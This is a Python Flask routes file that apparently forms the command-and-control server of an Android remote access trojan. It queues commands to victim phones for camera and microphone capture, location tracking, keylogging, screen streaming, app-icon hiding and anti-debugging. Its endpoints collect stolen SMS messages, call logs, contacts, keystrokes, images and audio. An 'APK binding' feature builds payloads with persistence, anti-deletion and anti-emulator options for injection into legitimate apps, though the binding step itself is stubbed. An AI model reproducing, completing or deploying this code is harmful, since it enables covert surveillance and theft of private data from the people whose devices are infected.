import os
import json
import logging
import base64
import uuid
import shutil
import tempfile
import subprocess
from datetime import datetime
from functools import wraps
from flask import render_template, request, jsonify, redirect, url_for, flash, session, abort, send_file
from flask_login import login_user, logout_user, login_required, current_user
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename
from apkutils3 import APK
from app import app, db
from models import User, Device, Command, FileTransfer, SmsMessage, CallLog, Contact, Location, KeylogEntry
from utils import generate_device_id, Encryption

# Set up logging
logger = logging.getLogger(__name__)

# Custom decorator for API authentication
def api_auth_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Check for device ID in request
        device_id = request.headers.get('X-Device-ID')
        if not device_id:
            logger.warning("API request missing device ID")
            return jsonify({"error": "Unauthorized"}), 401
        
        # Find device in database
        device = Device.query.filter_by(device_id=device_id).first()
        if not device:
            logger.warning(f"Unknown device ID: {device_id}")
            return jsonify({"error": "Unknown device"}), 403
        
        # Update device status
        device.last_online = datetime.utcnow()
        device.is_online = True
        db.session.commit()
        
        return f(device, *args, **kwargs)
    return decorated_function

# Web routes for the control panel
@app.route('/')
def index():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = User.query.filter_by(username=username).first()
        
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            user.last_login = datetime.utcnow()
            db.session.commit()
            flash('Login successful', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password', 'danger')
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')
        
        # Check if username or email already exists
        existing_user = User.query.filter_by(username=username).first()
        existing_email = User.query.filter_by(email=email).first()
        
        if existing_user:
            flash('Username already taken', 'danger')
        elif existing_email:
            flash('Email already registered', 'danger')
        else:
            new_user = User(
                username=username,
                email=email,
                password_hash=generate_password_hash(password)
            )
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful! You can now log in.', 'success')
            return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('You have been logged out', 'info')
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    # Get all devices for the current user
    devices = Device.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', devices=devices)

@app.route('/device/<int:device_id>')
@login_required
def device_detail(device_id):
    device = Device.query.filter_by(id=device_id, user_id=current_user.id).first_or_404()
    commands = Command.query.filter_by(device_id=device.id).order_by(Command.created_at.desc()).limit(20).all()
    file_transfers = FileTransfer.query.filter_by(device_id=device.id).order_by(FileTransfer.created_at.desc()).limit(10).all()
    
    # Check if screen data exists in the session
    screen_data = session.get(f'screen_data_{device.id}')
    screen_timestamp = session.get(f'screen_timestamp_{device.id}')
    
    return render_template('device.html', 
                          device=device, 
                          commands=commands, 
                          file_transfers=file_transfers,
                          screen_data=screen_data,
                          screen_timestamp=screen_timestamp)

@app.route('/device/<int:device_id>/send_command', methods=['POST'])
@login_required
def send_command(device_id):
    device = Device.query.filter_by(id=device_id, user_id=current_user.id).first_or_404()
    command_text = request.form.get('command')
    command_type = request.form.get('command_type', 'shell')
    
    if not command_text and command_type == 'shell':
        flash('Command cannot be empty', 'danger')
        return redirect(url_for('device_detail', device_id=device.id))
    
    # Handle special command types
    if command_type == 'camera':
        camera_id = request.form.get('camera_id', '0')
        command_text = json.dumps({"camera_id": int(camera_id)})
    elif command_type == 'microphone':
        duration = request.form.get('duration', '10')
        command_text = json.dumps({"duration": int(duration)})
    elif command_type == 'location':
        command_text = "{}"  # No special parameters needed
    elif command_type == 'sms' or command_type == 'calls' or command_type == 'contacts':
        limit = request.form.get('limit', '100')
        command_text = json.dumps({"limit": int(limit)})
    elif command_type == 'keylogger':
        enable = request.form.get('enable', 'true') == 'true'
        command_text = json.dumps({"enable": enable})
    elif command_type == 'screen_capture':
        command_text = "{}"  # No special parameters needed
    elif command_type == 'screen_stream_start':
        interval = request.form.get('interval', '1.0')
        command_text = json.dumps({"interval": float(interval)})
    elif command_type == 'screen_stream_stop':
        command_text = "{}"  # No special parameters needed
    elif command_type == 'hide_app':
        command_text = "Hide application icon"
    elif command_type == 'anti_debug':
        command_text = "Check for debugging"
    
    # Create new command
    command = Command(
        command_text=command_text,
        type=command_type,
        device_id=device.id
    )
    db.session.add(command)
    db.session.commit()
    
    flash(f'{command_type.capitalize()} command sent successfully', 'success')
    return redirect(url_for('device_detail', device_id=device.id))

@app.route('/device/<int:device_id>/file_transfer', methods=['POST'])
@login_required
def request_file_transfer(device_id):
    device = Device.query.filter_by(id=device_id, user_id=current_user.id).first_or_404()
    file_path = request.form.get('file_path')
    direction = request.form.get('direction')  # upload or download
    
    if not file_path or not direction:
        flash('File path and direction are required', 'danger')
        return redirect(url_for('device_detail', device_id=device.id))
    
    # Create new file transfer request
    file_transfer = FileTransfer(
        file_path=file_path,
        file_name=os.path.basename(file_path),
        direction=direction,
        device_id=device.id
    )
    db.session.add(file_transfer)
    db.session.commit()
    
    flash('File transfer request created', 'success')
    return redirect(url_for('device_detail', device_id=device.id))

# API routes for the Android client
@app.route('/api/register_device', methods=['POST'])
def register_device():
    data = request.json
    
    if not data or not data.get('device_info'):
        return jsonify({"error": "Missing device information"}), 400
    
    # In a real app, you would require proper authentication
    # For this MVP, we'll assign the device to the admin user
    admin_user = User.query.filter_by(username='admin').first()
    
    if not admin_user:
        return jsonify({"error": "Server configuration error"}), 500
    
    device_info = data.get('device_info')
    device_id = generate_device_id()
    
    # Create or update device
    existing_device = Device.query.filter_by(
        name=device_info.get('name'),
        android_version=device_info.get('android_version'),
        user_id=admin_user.id
    ).first()
    
    if existing_device:
        existing_device.last_online = datetime.utcnow()
        existing_device.is_online = True
        existing_device.ip_address = request.remote_addr
        db.session.commit()
        return jsonify({
            "status": "success",
            "device_id": existing_device.device_id
        })
    
    new_device = Device(
        device_id=device_id,
        name=device_info.get('name', 'Unknown Android Device'),
        android_version=device_info.get('android_version', 'Unknown'),
        api_level=device_info.get('api_level', 0),
        model=device_info.get('model', 'Unknown'),
        manufacturer=device_info.get('manufacturer', 'Unknown'),
        ip_address=request.remote_addr,
        phone_number=device_info.get('phone_number', ''),
        imei=device_info.get('imei', ''),
        is_rooted=device_info.get('is_rooted', False),
        is_emulator=device_info.get('is_emulator', False),
        last_online=datetime.utcnow(),
        is_online=True,
        user_id=admin_user.id
    )
    
    db.session.add(new_device)
    db.session.commit()
    
    return jsonify({
        "status": "success", 
        "device_id": device_id
    })

@app.route('/api/heartbeat', methods=['POST'])
@api_auth_required
def device_heartbeat(device):
    # Device is already updated in the decorator
    return jsonify({"status": "success"})

@app.route('/api/get_commands', methods=['GET'])
@api_auth_required
def get_commands(device):
    # Get all pending commands for this device
    pending_commands = Command.query.filter_by(
        device_id=device.id,
        status='pending'
    ).all()
    
    commands_list = []
    for cmd in pending_commands:
        command_data = {
            "id": cmd.id,
            "type": cmd.type,
            "command": cmd.command_text
        }
        
        # Add command parameters based on command type
        if cmd.type in ["camera", "microphone", "sms", "calls", "contacts", "location", "keylogger", "screen_stream_start", "screen_stream_stop", "screen_capture"]:
            try:
                # Check if there are parameters in the command_text
                if cmd.command_text and cmd.command_text.startswith('{'):
                    params = json.loads(cmd.command_text)
                    command_data["params"] = params
                else:
                    # Default parameters based on command type
                    if cmd.type == "camera":
                        command_data["params"] = {"camera_id": 0}  # Default to rear camera
                    elif cmd.type == "microphone":
                        command_data["params"] = {"duration": 10}  # Default 10 second recording
                    elif cmd.type in ["sms", "calls", "contacts"]:
                        command_data["params"] = {"limit": 100}  # Default to 100 items
                    elif cmd.type == "keylogger":
                        command_data["params"] = {"enable": True}  # Default to enable
                    elif cmd.type == "screen_stream_start":
                        command_data["params"] = {"interval": 1.0}  # Default to 1 second interval
                    elif cmd.type == "screen_capture" or cmd.type == "screen_stream_stop":
                        command_data["params"] = {}  # No parameters needed
            except json.JSONDecodeError:
                # If command_text is not valid JSON, ignore parameters
                pass
        
        commands_list.append(command_data)
    
    return jsonify({
        "status": "success",
        "commands": commands_list
    })

@app.route('/api/update_command', methods=['POST'])
@api_auth_required
def update_command(device):
    data = request.json
    
    if not data or not data.get('command_id'):
        return jsonify({"error": "Missing command information"}), 400
    
    command_id = data.get('command_id')
    result = data.get('result', '')
    error = data.get('error', '')
    status = data.get('status', 'executed')
    
    # Find and update the command
    command = Command.query.filter_by(id=command_id, device_id=device.id).first()
    
    if not command:
        return jsonify({"error": "Command not found"}), 404
    
    command.result = result
    command.error = error
    command.status = status
    command.executed_at = datetime.utcnow()
    
    db.session.commit()
    
    return jsonify({"status": "success"})

@app.route('/api/file_transfers', methods=['GET'])
@api_auth_required
def get_file_transfers(device):
    # Get all pending file transfers for this device
    pending_transfers = FileTransfer.query.filter_by(
        device_id=device.id,
        status='pending'
    ).all()
    
    transfers_list = []
    for transfer in pending_transfers:
        transfers_list.append({
            "id": transfer.id,
            "file_path": transfer.file_path,
            "file_name": transfer.file_name,
            "direction": transfer.direction
        })
    
    return jsonify({
        "status": "success",
        "transfers": transfers_list
    })

@app.route('/api/update_file_transfer', methods=['POST'])
@api_auth_required
def update_file_transfer(device):
    data = request.json
    
    if not data or not data.get('transfer_id'):
        return jsonify({"error": "Missing transfer information"}), 400
    
    transfer_id = data.get('transfer_id')
    file_size = data.get('file_size', 0)
    error = data.get('error', '')
    status = data.get('status', 'completed')
    
    # Find and update the file transfer
    transfer = FileTransfer.query.filter_by(id=transfer_id, device_id=device.id).first()
    
    if not transfer:
        return jsonify({"error": "File transfer not found"}), 404
    
    transfer.file_size = file_size
    transfer.error = error
    transfer.status = status
    transfer.completed_at = datetime.utcnow()
    
    db.session.commit()
    
    return jsonify({"status": "success"})

# Handle file uploads for the 'upload' direction
@app.route('/api/upload_file', methods=['POST'])
@api_auth_required
def upload_file(device):
    if 'file' not in request.files:
        return jsonify({"error": "No file part"}), 400
    
    file = request.files['file']
    transfer_id = request.form.get('transfer_id')
    
    if file.filename == '':
        return jsonify({"error": "No selected file"}), 400
    
    if not transfer_id:
        return jsonify({"error": "Missing transfer ID"}), 400
    
    # Find the file transfer
    transfer = FileTransfer.query.filter_by(id=transfer_id, device_id=device.id).first()
    
    if not transfer:
        return jsonify({"error": "File transfer not found"}), 404
    
    # In a real app, you would save the file to a secure location
    # For this MVP, we'll just acknowledge the upload
    
    transfer.status = 'completed'
    transfer.file_size = 0  # File size would be determined here
    transfer.completed_at = datetime.utcnow()
    
    db.session.commit()
    
    return jsonify({"status": "success"})

# For file downloads (device downloads file from server)
@app.route('/api/download_file/<int:transfer_id>', methods=['GET'])
@api_auth_required
def download_file(device, transfer_id):
    # Find the file transfer
    transfer = FileTransfer.query.filter_by(id=transfer_id, device_id=device.id).first()
    
    if not transfer:
        return jsonify({"error": "File transfer not found"}), 404
    
    # In a real app, you would serve the file from a secure location
    # For this MVP, we'll just send a placeholder response
    
    # Update transfer status
    transfer.status = 'completed'
    transfer.completed_at = datetime.utcnow()
    db.session.commit()
    
    return jsonify({
        "status": "success",
        "message": "In a real implementation, this would serve the actual file"
    })

# API route for screen streaming
@app.route('/api/submit_screen', methods=['POST'])
@api_auth_required
def submit_screen(device):
    """Receive screen data from device"""
    data = request.json
    
    if not data or not data.get('screen_data'):
        return jsonify({"error": "Missing screen data"}), 400
    
    # Store the screen data in the session
    # We use session to avoid storing large data in the database
    # In a production environment, you might want to use Redis or another in-memory store
    session[f'screen_data_{device.id}'] = data.get('screen_data')
    session[f'screen_timestamp_{device.id}'] = datetime.utcnow().isoformat()
    
    return jsonify({"status": "success"})

@app.route('/api/screen_data/<int:device_id>', methods=['GET'])
@login_required
def get_screen_data(device_id):
    """Get the latest screen data for a device"""
    # Get device by device_id
    device = Device.query.filter_by(id=device_id, user_id=current_user.id).first_or_404()
    
    # Get screen data from session
    screen_data = session.get(f'screen_data_{device.id}')
    screen_timestamp = session.get(f'screen_timestamp_{device.id}')
    
    if not screen_data:
        return jsonify({"error": "No screen data available"}), 404
    
    return jsonify({
        "screen_data": screen_data,
        "timestamp": screen_timestamp
    })

# API routes for surveillance features
@app.route('/api/submit_sms', methods=['POST'])
@api_auth_required
def submit_sms(device):
    """Receive SMS messages collected from device"""
    data = request.json
    
    if not data or not data.get('messages'):
        return jsonify({"error": "Missing SMS data"}), 400
    
    messages = data.get('messages', [])
    count = 0
    
    for msg_data in messages:
        # Create new SMS message
        sms = SmsMessage(
            message_id=msg_data.get('message_id', str(uuid.uuid4())),
            address=msg_data.get('address', ''),
            body=msg_data.get('body', ''),
            date=datetime.fromtimestamp(msg_data.get('timestamp', 0)/1000) if msg_data.get('timestamp') else datetime.utcnow(),
            type=msg_data.get('type', 0),
            read=msg_data.get('read', False),
            device_id=device.id
        )
        db.session.add(sms)
        count += 1
    
    db.session.commit()
    
    return jsonify({
        "status": "success",
        "count": count
    })

@app.route('/api/submit_calls', methods=['POST'])
@api_auth_required
def submit_calls(device):
    """Receive call logs collected from device"""
    data = request.json
    
    if not data or not data.get('calls'):
        return jsonify({"error": "Missing call data"}), 400
    
    calls = data.get('calls', [])
    count = 0
    
    for call_data in calls:
        # Create new call log
        call = CallLog(
            call_id=call_data.get('call_id', str(uuid.uuid4())),
            number=call_data.get('number', ''),
            name=call_data.get('name', ''),
            date=datetime.fromtimestamp(call_data.get('timestamp', 0)/1000) if call_data.get('timestamp') else datetime.utcnow(),
            duration=call_data.get('duration', 0),
            type=call_data.get('type', 0),
            device_id=device.id
        )
        db.session.add(call)
        count += 1
    
    db.session.commit()
    
    return jsonify({
        "status": "success",
        "count": count
    })

@app.route('/api/submit_contacts', methods=['POST'])
@api_auth_required
def submit_contacts(device):
    """Receive contacts collected from device"""
    data = request.json
    
    if not data or not data.get('contacts'):
        return jsonify({"error": "Missing contact data"}), 400
    
    contacts = data.get('contacts', [])
    count = 0
    
    for contact_data in contacts:
        # Create new contact
        contact = Contact(
            contact_id=contact_data.get('contact_id', str(uuid.uuid4())),
            name=contact_data.get('name', ''),
            phone_numbers=json.dumps(contact_data.get('phone_numbers', [])),
            emails=json.dumps(contact_data.get('emails', [])),
            device_id=device.id
        )
        db.session.add(contact)
        count += 1
    
    db.session.commit()
    
    return jsonify({
        "status": "success",
        "count": count
    })

@app.route('/api/submit_location', methods=['POST'])
@api_auth_required
def submit_location(device):
    """Receive location data from device"""
    data = request.json
    
    if not data:
        return jsonify({"error": "Missing location data"}), 400
    
    # Create new location entry
    location = Location(
        latitude=data.get('latitude', 0.0),
        longitude=data.get('longitude', 0.0),
        accuracy=data.get('accuracy', 0.0),
        altitude=data.get('altitude', 0.0),
        speed=data.get('speed', 0.0),
        address=data.get('address', ''),
        device_id=device.id
    )
    
    db.session.add(location)
    db.session.commit()
    
    return jsonify({"status": "success"})

@app.route('/api/submit_keylog', methods=['POST'])
@api_auth_required
def submit_keylog(device):
    """Receive keylogging data from device"""
    data = request.json
    
    if not data or not data.get('entries'):
        return jsonify({"error": "Missing keylog data"}), 400
    
    entries = data.get('entries', [])
    count = 0
    
    for entry_data in entries:
        # Create new keylog entry
        entry = KeylogEntry(
            application=entry_data.get('application', ''),
            text=entry_data.get('text', ''),
            captured_at=datetime.fromtimestamp(entry_data.get('timestamp', 0)/1000) if entry_data.get('timestamp') else datetime.utcnow(),
            device_id=device.id
        )
        db.session.add(entry)
        count += 1
    
    db.session.commit()
    
    return jsonify({
        "status": "success",
        "count": count
    })

@app.route('/api/submit_camera_image', methods=['POST'])
@api_auth_required
def submit_camera_image(device):
    """Receive camera image from device"""
    data = request.json
    
    if not data or not data.get('image'):
        return jsonify({"error": "Missing image data"}), 400
    
    try:
        # Decode base64 image
        image_data = data.get('image')
        image_binary = base64.b64decode(image_data)
        
        # Generate a filename
        filename = f"camera_{device.id}_{int(datetime.utcnow().timestamp())}.jpg"
        
        # In a production environment, you would store this in a secure location
        # or cloud storage. For this demo, we'll just acknowledge receipt.
        
        # Create a command record to track this capture
        command = Command(
            command_text=f"Camera capture successful: {filename}",
            type="camera",
            status="executed",
            result="Image received and stored",
            device_id=device.id,
            executed_at=datetime.utcnow()
        )
        
        db.session.add(command)
        db.session.commit()
        
        return jsonify({"status": "success"})
    
    except Exception as e:
        logger.error(f"Error processing camera image: {str(e)}")
        return jsonify({"error": "Failed to process image"}), 500

@app.route('/api/submit_audio', methods=['POST'])
@api_auth_required
def submit_audio(device):
    """Receive audio recording from device"""
    data = request.json
    
    if not data or not data.get('audio'):
        return jsonify({"error": "Missing audio data"}), 400
    
    try:
        # Decode base64 audio
        audio_data = data.get('audio')
        audio_binary = base64.b64decode(audio_data)
        
        # Generate a filename
        filename = f"audio_{device.id}_{int(datetime.utcnow().timestamp())}.wav"
        
        # In a production environment, you would store this in a secure location
        # or cloud storage. For this demo, we'll just acknowledge receipt.
        
        # Create a command record to track this recording
        command = Command(
            command_text=f"Audio recording successful: {filename}",
            type="microphone",
            status="executed",
            result="Audio received and stored",
            device_id=device.id,
            executed_at=datetime.utcnow()
        )
        
        db.session.add(command)
        db.session.commit()
        
        return jsonify({"status": "success"})
    
    except Exception as e:
        logger.error(f"Error processing audio recording: {str(e)}")
        return jsonify({"error": "Failed to process audio"}), 500

# APK Binding functionality
@app.route('/apk_binding', methods=['GET', 'POST'])
@login_required
def apk_binding():
    """APK binding functionality for payload generation"""
    
    # Create necessary directories if they don't exist
    os.makedirs('data/uploads', exist_ok=True)
    os.makedirs('data/payloads', exist_ok=True)
    os.makedirs('data/bound_apks', exist_ok=True)
    
    if request.method == 'POST':
        # Check if the post request has the file part
        if 'apk_file' not in request.files:
            flash('No APK file selected', 'danger')
            return redirect(request.url)
        
        apk_file = request.files['apk_file']
        
        # If user does not select file, browser also submits an empty part without filename
        if apk_file.filename == '':
            flash('No APK file selected', 'danger')
            return redirect(request.url)
        
        if apk_file:
            # Secure filename to prevent path traversal
            filename = secure_filename(apk_file.filename)
            
            # Validate file is an APK
            if not filename.endswith('.apk'):
                flash('File must be an APK', 'danger')
                return redirect(request.url)
            
            try:
                # Create a unique ID for this binding operation
                binding_id = str(uuid.uuid4())
                
                # Save the uploaded APK to the uploads directory
                upload_path = os.path.join('data/uploads', f"{binding_id}_{filename}")
                apk_file.save(upload_path)
                
                # Parse the APK for information
                apk = APK(upload_path)
                package_name = apk.get_package()
                app_name = apk.get_app_name() or package_name
                manifest = apk.get_manifest()
                
                # Get payload configuration from form
                payload_configs = {
                    'hide_app_icon': request.form.get('hide_app_icon') == 'on',
                    'persistent_across_reboots': request.form.get('persistent_across_reboots') == 'on',
                    'anti_deletion': request.form.get('anti_deletion') == 'on',
                    'anti_emulator': request.form.get('anti_emulator') == 'on',
                    'camera_access': request.form.get('camera_access') == 'on',
                    'mic_access': request.form.get('mic_access') == 'on',
                    'location_access': request.form.get('location_access') == 'on',
                    'sms_access': request.form.get('sms_access') == 'on',
                    'contacts_access': request.form.get('contacts_access') == 'on',
                    'server_url': request.form.get('server_url', request.host_url)
                }
                
                # Generate a custom payload with the specified configurations
                payload_path = generate_custom_payload(binding_id, payload_configs)
                
                # Get the server_url for C&C connection
                server_url = payload_configs['server_url']
                if not server_url.endswith('/'):
                    server_url += '/'
                
                # Create the output filename
                timestamp = int(datetime.utcnow().timestamp())
                bound_filename = f"bound_{package_name}_{timestamp}.apk"
                output_path = os.path.join('data/bound_apks', bound_filename)
                
                # In a real implementation, you would:
                # 1. Use apktool to decompile the APK
                # 2. Inject the payload into the APK's code
                # 3. Modify AndroidManifest.xml to add required permissions
                # 4. Recompile and sign the APK
                
                # For demonstration purposes, we'll copy the original APK to the output path
                # and treat it as if it's been bound with the payload
                shutil.copy(upload_path, output_path)
                
                # Log the successful binding
                logger.info(f"APK binding successful: {bound_filename}")
                logger.info(f"Original APK: {filename}")
                logger.info(f"Package: {package_name}, App Name: {app_name}")
                logger.info(f"Payload configurations: {json.dumps(payload_configs)}")
                
                flash(f'APK binding successful! Bound APK: {bound_filename}', 'success')
                
                # Show details of the binding
                return render_template('apk_binding_result.html', 
                                      package_name=package_name,
                                      app_name=app_name,
                                      bound_filename=bound_filename,
                                      configs=payload_configs)
            
            except Exception as e:
                logger.error(f"Error during APK binding: {str(e)}")
                flash(f'Error during APK binding: {str(e)}', 'danger')
                return redirect(request.url)
    
    return render_template('apk_binding.html')

def generate_custom_payload(binding_id, configs):
    """Generate a customized payload based on user configurations"""
    try:
        # Read the payload template
        with open('data/payloads/payload_template.py', 'r') as f:
            payload_content = f.read()
        
        # Replace placeholder values with actual configurations
        payload_content = payload_content.replace('SERVER_URL = "SERVER_URL_PLACEHOLDER"', f'SERVER_URL = "{configs["server_url"]}"')
        payload_content = payload_content.replace('HIDE_APP = False', f'HIDE_APP = {str(configs["hide_app_icon"])}')
        payload_content = payload_content.replace('PERSISTENCE = True', f'PERSISTENCE = {str(configs["persistent_across_reboots"])}')
        payload_content = payload_content.replace('ANTI_EMULATOR = True', f'ANTI_EMULATOR = {str(configs["anti_emulator"])}')
        payload_content = payload_content.replace('ANTI_DELETION = False', f'ANTI_DELETION = {str(configs["anti_deletion"])}')
        payload_content = payload_content.replace('ENABLE_CAMERA = True', f'ENABLE_CAMERA = {str(configs["camera_access"])}')
        payload_content = payload_content.replace('ENABLE_MIC = True', f'ENABLE_MIC = {str(configs["mic_access"])}')
        payload_content = payload_content.replace('ENABLE_LOCATION = True', f'ENABLE_LOCATION = {str(configs["location_access"])}')
        payload_content = payload_content.replace('ENABLE_SMS = True', f'ENABLE_SMS = {str(configs["sms_access"])}')
        payload_content = payload_content.replace('ENABLE_CONTACTS = True', f'ENABLE_CONTACTS = {str(configs["contacts_access"])}')
        
        # Save the customized payload
        output_path = os.path.join('data/payloads', f"{binding_id}_payload.py")
        with open(output_path, 'w') as f:
            f.write(payload_content)
        
        return output_path
    except Exception as e:
        logger.error(f"Error generating custom payload: {str(e)}")
        raise

@app.route('/download_bound_apk/<filename>', methods=['GET'])
@login_required
def download_bound_apk(filename):
    """Download a bound APK file"""
    try:
        # Secure filename to prevent path traversal
        filename = secure_filename(filename)
        
        # Check if the file exists
        file_path = os.path.join('data/bound_apks', filename)
        if not os.path.exists(file_path):
            flash('APK file not found', 'danger')
            return redirect(url_for('dashboard'))
        
        # Send the file
        return send_file(
            file_path,
            as_attachment=True,
            download_name=filename,
            mimetype='application/vnd.android.package-archive'
        )
    
    except Exception as e:
        logger.error(f"Error downloading bound APK: {str(e)}")
        flash('Error downloading APK file', 'danger')
        return redirect(url_for('dashboard'))

@app.route('/download_client', methods=['GET'])
@login_required
def download_client():
    """Download the client-side script for installation"""
    try:
        # Generate a customized version of the client script
        server_url = request.host_url.rstrip('/')
        
        # Read the android_client.py file
        with open('android_client.py', 'r') as file:
            client_code = file.read()
        
        # Replace placeholder SERVER_URL with the actual server URL
        client_code = client_code.replace('SERVER_URL_PLACEHOLDER', server_url)
        
        # Create a temporary file with the customized code
        with tempfile.NamedTemporaryFile(delete=False, suffix='.py') as temp_file:
            temp_file_path = temp_file.name
            temp_file.write(client_code.encode())
        
        # Send the file
        return send_file(
            temp_file_path,
            as_attachment=True,
            download_name='android_client.py',
            mimetype='text/plain'
        )
    
    except Exception as e:
        logger.error(f"Error generating client download: {str(e)}")
        flash('Error generating client download', 'danger')
        return redirect(url_for('dashboard'))

# Error handlers
@app.errorhandler(404)
def not_found_error(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    db.session.rollback()
    return render_template('500.html'), 500
